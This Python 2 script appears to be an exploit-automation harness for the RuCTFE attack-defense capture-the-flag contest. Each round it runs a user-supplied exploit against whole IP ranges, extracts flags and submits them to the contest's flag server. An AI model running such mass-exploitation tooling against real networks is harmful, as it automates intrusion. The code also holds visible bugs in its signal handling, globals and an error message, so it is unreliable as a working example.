import itertools
import netaddr
import inspect
import requests
import signal
import pebble
import time
import sys
import os
import re
from concurrent.futures import TimeoutError
from multiprocessing import Lock
from pwn import *

#######################################

submitter_url = "http://localhost:8080"
round_time = 2 * 60
print_out = False
flag_regex = re.compile("\w{31}=")

#######################################

_service = None
_name = None
_ip_list = []
_workers = 1
_timeout = 10
_discard_flags = False

def _exploit_empty_callback(ip):
    sys.stderr.write("error: exploit callback not set\n")
    sys.exit(1)

_exploit_callback = _exploit_empty_callback

#######################################

_pool = None
_stop = False

_log_lock = Lock()
_log_file = open("missed_flags.log", "w")

def kill(signal, frame):
    sys.stderr.write("killing all workers, wait...")
    _stop = True
    if _pool == None:
        sys.exit(0)
    _pool.set()

@pebble.synchronized(_log_lock)
def _log(s):
    _log_file.write(s)
    _log_file.flush()

def _submit_flags(future):
    try:
        data = future.result()
    except TimeoutError:
        return

    team = data[0]
    service = data[1]
    flags = flag_regex.findall(data[2])
    #print data
    if len(flags) == 0:
        return

    print "PWNED %d" % team

    if print_out:
        print "[%s] exploited team %s:\n%s\n" % (time.strftime("%H:%M:%S"), team, data[2])
  
    try:
        cc = remote("flags.ructfe.org", 31337)
        cc.recvuntil("exit)")
        for f in flags:
            cc.send(f +"\n")
        cc.send("\n")
        #print cc.read()
        cc.close()
    except:
        sys.stderr.write("warning: flags submitting failed.\n")
        missed = ""
        for f in flags:
            missed += f + "\n"
        _log(missed)

def _run_exploit(ip, exploit, service):
    ip = str(ip)
    data = exploit(ip)
    return (ip, service, data)

def _get_caller_module():
    stack = inspect.stack()
    frm = stack[2][0] #walk 2 frames back
    module = inspect.getmodule(frm)
    return module

def run():
    global _name, _ip_list, _workers, _timeout, flag_, _ip_queue, _stop

    mod = _get_caller_module()
    _name = os.path.splitext(mod.__file__)[0]

    if "SERVICE" not in mod.__dict__:
        sys.stderr.write("error: specify the SERVICE name in the exploit module\n")
        sys.exit(1)

    _service = mod.SERVICE

    if "INCLUDE" not in mod.__dict__:
        sys.stderr.write("error: specify the EXCLUDE list in the exploit module\n")
        sys.exit(1)

    for ip_range in mod.INCLUDE:
        _ip_list += list(netaddr.IPNetwork(ip_range))

    if "EXCLUDE" in mod.__dict__:
        exclude_list = []
        for ip_range in mod.EXCLUDE:
            exclude_list += list(netaddr.IPNetwork(ip_range))

        _ip_list = list(set(_ip_list) - set(exclude_list))

    if "WORKERS" in mod.__dict__:
        _workers = mod.WORKERS
    if "TIMEOUT" in mod.__dict__:
        _timeout = mod.TIMEOUT

    if "NOFLAGS" in mod.__dict__:
        _discard_flags = mod.NOFLAGS

    if "exploit" not in mod.__dict__:
        sys.stderr.write("error: define the exploit(ip) method in the exploit module\n")
        sys.exit(1)
    _exploit_callback = mod.exploit

    #print len(_ip_list)

    _pool = pebble.ProcessPool(max_workers=_workers, max_tasks=len(_ip_list))

    signal.signal(signal.SIGINT, kill)

    while not _stop:
        if print_out:
            print "[%s] new round" % time.strftime("%H:%M:%S")

        start = time.time()

        for ip in _ip_list:
            #print ip
            future = _pool.schedule(_run_exploit, args=[ip, _exploit_callback, _service], timeout=_timeout)
            if not _discard_flags:
                future.add_done_callback(_submit_flags)

        #wait the round end
        time_left = round_time - (time.time() - start)
        if time_left < round_time:
            time.sleep(time_left)

        #_pool.close()

        _pool = pebble.ProcessPool(max_workers=_workers, max_tasks=len(_ip_list))




